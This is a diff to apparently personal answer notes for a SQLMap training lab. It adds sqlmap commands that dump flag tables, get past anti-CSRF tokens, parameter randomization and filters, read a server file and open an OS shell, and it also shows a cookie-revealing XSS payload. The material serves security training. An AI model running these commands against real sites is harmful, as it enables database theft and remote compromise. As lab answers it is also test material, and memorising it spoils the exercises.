@@ -227,6 +227,26 @@ sqlmap -u 'http://94.237.58.137:56113/case1.php?id=1' -D 'testdb' -T flag1 --bat
  sqlmap -u 'http://94.237.58.137:56113/case1.php?id=1' --search -C style --batch
  "What's the Kimberly user's password? (Case #1)"
  sqlmap -u 'http://94.237.58.137:56113/case1.php?id=1' --batch --dump
+ -----------------
+  What's the contents of table flag8? (Case #8)
+  Students need to click on the "Submit" button, then open the Network Tab to view the request form data after selecting the POST request to "case8.php" that includes the anti-CSRF token name and value:
+  sqlmap -u 'http://94.237.58.137:56113/case8.php?' --data 'id=1&t0ken=K3fnvaik6w4oVEnxABwPSjLJnwGIlGpZPYcAG9YQ' --csrf-token=t0ken --batch --dump
+
+  "What's the contents of table flag9? (Case #9)"
+  sqlmap -u "http://94.237.58.137:56113/case9.php?id=1&uid=3946810147" --randomize=uid --batch --dump
+
+  "What's the contents of table flag10? (Case #10)"
+  sqlmap -u 'http://94.237.58.137:56113/case10.php' --data="id=1" --random-agent --batch --dump
+  "What's the contents of table flag11? (Case #11)"
+   sqlmap -u 'http://94.237.58.137:56113/case11.php?id=1' --tamper=between -T flag11 --batch --dump
+   -------------------------
+    Try to use SQLMap to read the file "/var/www/html/flag.txt".
+  sqlmap -u 'http://138.68.156.57:31020?id=1' --file-read "/var/www/html/flag.txt" --batch
+  cat /home/htb-ac413848/.local/share/sqlmap/output/138.68.156.57/files/_var_www_html_flag.txt
+  "Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host."
+  sqlmap -u 'http://138.68.156.57:31020?id=1' --os-shell --technique=E --batch
+  cat /flag.txt
+
 ----------------------------
  <script>alert(document.cookie)</script>
   To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.
